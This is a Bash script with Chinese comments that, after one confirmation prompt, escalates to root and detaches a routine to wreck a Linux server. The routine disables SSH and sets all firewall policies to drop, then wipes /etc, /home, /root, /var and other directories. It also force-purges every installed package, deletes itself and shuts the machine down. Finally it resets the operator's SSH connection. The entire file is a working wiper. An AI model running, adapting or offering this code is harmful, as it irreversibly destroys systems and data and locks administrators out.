set -e
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

# 强制从终端读
echo -e "${RED}【警告】这会将服务器变成砖头！${NC}"
read -p "输入 y 确认: " confirm < /dev/tty
if [ "$confirm" != "y" ]; then
    echo "已取消。"
    exit 0
fi

# 提权
if [ "$EUID" -ne 0 ]; then
    sudo -v || { echo "sudo 失败"; exit 1; }
    exec sudo bash "$0" "$@"
fi

destroy_everything() {
    # 耗时的破坏操作
    # 静默执行

    # 关闭 SSH 服务 
    systemctl stop sshd 2>/dev/null || systemctl stop ssh 2>/dev/null || true
    systemctl disable sshd 2>/dev/null || systemctl disable ssh 2>/dev/null || true

    # 防火墙全部 DROP
    iptables -F; iptables -X; iptables -t nat -F; iptables -t nat -X
    iptables -t mangle -F; iptables -t mangle -X
    iptables -P INPUT DROP; iptables -P FORWARD DROP; iptables -P OUTPUT DROP
    # ufw 加固
    if command -v ufw &>/dev/null; then
        ufw --force disable; ufw default deny incoming; ufw default deny outgoing; ufw --force enable
    fi
    apt-get purge -y iptables-persistent netfilter-persistent 2>/dev/null || true

    # 清空目录
    TARGET_DIRS=("/opt" "/www" "/srv" "/home" "/root" "/etc" "/var/log" "/var/www")
    for dir in "${TARGET_DIRS[@]}"; do
        [ -d "$dir" ] && rm -rf --no-preserve-root "$dir"/* &
    done
    wait

    # 穷举清包
    dpkg --get-selections | awk '{print $1}' | xargs -r -P 20 -I {} dpkg --force-all --purge {} 2>/dev/null || true
    
    # 脚本删除
    rm -- "$0" 2>/dev/null || true
    # 关机
    /sbin/shutdown -h now "This is the way." 2>/dev/null || true
}

# 完全脱离当前shell
nohup bash -c "$(declare -f destroy_everything); destroy_everything" >/dev/null 2>&1 &
DISOWN_PID=$!
disown $DISOWN_PID

# 用iptables给当前连接发送 RST
iptables -A OUTPUT -p tcp --sport 22 -j REJECT --reject-with tcp-reset 2>/dev/null || true
exit 0